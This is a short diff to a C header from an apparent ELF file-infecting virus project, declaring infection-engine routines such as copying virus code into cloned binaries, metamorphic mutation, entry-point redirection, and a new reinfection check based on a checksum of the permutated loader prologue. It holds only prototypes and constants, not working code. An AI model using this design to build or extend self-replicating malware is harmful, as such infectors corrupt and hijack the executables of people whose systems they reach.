@@ -12,12 +12,13 @@
 # include "accessors.h"
 
 /*
-** hardcoded signature for
-** "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
+** virus infection detection mechanism
+** hardcoded checksum of the unordered (because permutated) push of
+** all registers and flags at the beginning of the loader code
 */
 
-# define SIGNATURE_LEN		64
-# define SIGNATURE_CKSUM	0x1526
+# define LOADER_PROLOGUE_LEN	22
+# define LOADER_PROLOGUE_SUM	0x6e3
 
 /*
 ** entry point related informations
@@ -45,6 +46,7 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr file_ref, stru
 ** infection engine routines
 */
 
+bool		not_infected(const struct entry *file_entry, struct safe_ptr file_ref);
 bool		find_entry(struct entry *entry, struct safe_ptr ref);
 bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
 bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
@@ -52,6 +54,7 @@ bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, 
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
 bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, uint64_t seed, size_t *full_virus_size, const struct virus_header *vhdr);
 bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
+bool		change_entry(struct safe_ptr clone_ref, const struct entry *file_entry, size_t dist_jmpclient_loader);
 
 /*
 ** elf iterators
